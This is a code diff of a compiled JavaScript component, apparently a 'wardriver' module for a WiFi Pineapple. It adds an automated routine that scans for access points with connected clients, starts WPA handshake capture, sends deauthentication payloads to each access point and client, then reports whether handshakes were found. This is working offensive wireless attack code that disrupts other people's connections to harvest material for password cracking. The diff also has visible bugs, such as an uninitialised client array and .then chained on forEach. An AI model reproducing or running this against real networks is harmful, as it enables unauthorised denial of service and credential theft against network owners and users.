@@ -634,10 +634,7 @@
                         case 0: return [4 /*yield*/, this.API.APIGetAsync('/api/recon/status')];
                         case 1:
                             reconStatusResp = _a.sent();
-                            setTimeout(function () {
-                                return reconStatusResp;
-                            }, 20000);
-                            return [2 /*return*/];
+                            return [2 /*return*/, reconStatusResp];
                     }
                 });
             }); };
@@ -690,21 +687,34 @@
                     }
                 });
             }); };
-            var deauthClient = function (clientObject) { return __awaiter(_this, void 0, void 0, function () {
+            var deauthClient = function (client) { return __awaiter(_this, void 0, void 0, function () {
+                var deauthClientPayload, deauthBssidResp;
                 return __generator(this, function (_a) {
-                    return [2 /*return*/];
+                    switch (_a.label) {
+                        case 0:
+                            deauthClientPayload = {
+                                bssid: client.ap_mac,
+                                mac: client.client_mac,
+                                multiplier: 5,
+                                channel: 11
+                            };
+                            return [4 /*yield*/, this.API.APIPostAsync('/api/pineap/deauth/ap', deauthClientPayload)];
+                        case 1:
+                            deauthBssidResp = _a.sent();
+                            return [2 /*return*/, deauthBssidResp];
+                    }
                 });
             }); };
-            var deauthBssid = function (apObject) { return __awaiter(_this, void 0, void 0, function () {
+            var deauthBssid = function (ap) { return __awaiter(_this, void 0, void 0, function () {
                 var clientArray, deauthBssidPayload, deauthBssidResp;
                 return __generator(this, function (_a) {
                     switch (_a.label) {
                         case 0:
-                            apObject.clients.forEach(function (client) {
+                            ap.clients.forEach(function (client) {
                                 clientArray.push(client.client_mac);
                             });
                             deauthBssidPayload = {
-                                bssid: apObject.bssid,
+                                bssid: ap.bssid,
                                 multiplier: 5,
                                 channel: 11,
                                 clients: clientArray
@@ -716,54 +726,83 @@
                     }
                 });
             }); };
+            var getHandshakeStatus = function () { return __awaiter(_this, void 0, void 0, function () {
+                var getHandshakeStatusResp;
+                return __generator(this, function (_a) {
+                    switch (_a.label) {
+                        case 0: return [4 /*yield*/, this.API.APIGetAsync('/api/pineap/handshakes')];
+                        case 1:
+                            getHandshakeStatusResp = _a.sent();
+                            return [2 /*return*/, getHandshakeStatusResp];
+                    }
+                });
+            }); };
+            var sendNotification = function (notificationString) { return __awaiter(_this, void 0, void 0, function () {
+                var notification_payload, notificationResp;
+                return __generator(this, function (_a) {
+                    switch (_a.label) {
+                        case 0:
+                            notification_payload = {
+                                level: 1,
+                                message: notificationString,
+                                module_name: 'wardriver'
+                            };
+                            return [4 /*yield*/, this.API.APIPutAsync('/api/notifications', notification_payload)];
+                        case 1:
+                            notificationResp = _a.sent();
+                            return [2 /*return*/, notificationResp];
+                    }
+                });
+            }); };
             var scanID;
             var currentBssid;
             var currentClient;
-            getReconStatus();
-            stopRecon();
-            startRecon();
-            /*
-                    getReconStatus().then((reconResp) => { // get status of recon scan
-                            if (reconResp.scanRunning) { // if recon is running, stop it
-                                stopRecon().then(() => {
-                                    setSettings().then(() => { // set pineAP settings
-                                        startRecon().then((startResp) => { // start recon
-                                            if (startResp.scanRunning) {
-                                                scanID = startResp.scanID;
-                                                setTimeout(() => { // run recon for x seconds
-                                                    stopRecon().then((stopReconResponse) => { // stop recon
-                                                        if (stopReconResponse.success) {
-                                                            getReconStatusById(scanID).then((reconScanResults) => {  // get recon scan results
-                                                                if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
-                                                                    reconScanResults.APResults.forEach((ap) => { // loop through APs
-                                                                        if (ap.clients.length > 0) { // if any have clients
-                                                                            currentBssid = ap.bssid;
-                                                                            startHandshakeCapture(ap.bssid).then(() => { // start handshake
-                                                                                deauthBssid(ap);
-                                                                                ap.clients.forEach((client) => { // loop through clients
-                                                                                    currentClient = client;
-                                                                                    deauthClient(client);
-                                                                                }).then(() => {
-                                                                                    setTimeout(() => {  // rest for 20 secs to collect lazy handshakes
-                                                                                        getHandshakeStatus().then((handShakeStatus) => { // check for handshakes
-                                                                                            sendNotification(handShakeStatus); // tell the user our results
-                                                                                        });
-                                                                                    }, 20000);
-                                                                                });
+            getReconStatus().then(function (reconResp) {
+                if (reconResp.scanRunning) { // if recon is running, stop it
+                    stopRecon().then(function () {
+                        setSettings().then(function () {
+                            startRecon().then(function (startResp) {
+                                if (startResp.scanRunning) {
+                                    scanID = startResp.scanID;
+                                    setTimeout(function () {
+                                        stopRecon().then(function (stopReconResponse) {
+                                            if (stopReconResponse.success) {
+                                                getReconStatusById(scanID).then(function (reconScanResults) {
+                                                    if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
+                                                        reconScanResults.APResults.forEach(function (ap) {
+                                                            if (ap.clients.length > 0) { // if any have clients
+                                                                currentBssid = ap.bssid;
+                                                                startHandshakeCapture(ap.bssid).then(function () {
+                                                                    deauthBssid(ap);
+                                                                    ap.clients.forEach(function (client) {
+                                                                        currentClient = client;
+                                                                        deauthClient(client);
+                                                                    }).then(function () {
+                                                                        setTimeout(function () {
+                                                                            getHandshakeStatus().then(function (handShakeStatus) {
+                                                                                if (handShakeStatus.handshakes != null) {
+                                                                                    sendNotification('Handshakes Found!'); // tell the user our results
+                                                                                }
+                                                                                else {
+                                                                                    sendNotification('Sorry, no handshakes found :(');
+                                                                                }
                                                                             });
-                                                                        }
+                                                                        }, 20000);
                                                                     });
-                                                                }
-                                                            });
-                                                        }
-                                                    });
-                                                }, 31000);
+                                                                });
+                                                            }
+                                                        });
+                                                    }
+                                                });
                                             }
                                         });
-                                    });
-                                });
-                            }
-                    });*/
+                                    }, 31000);
+                                }
+                            });
+                        });
+                    });
+                }
+            });
         };
         WarDriverComponent.ctorParameters = function () { return [
             { type: ApiService }
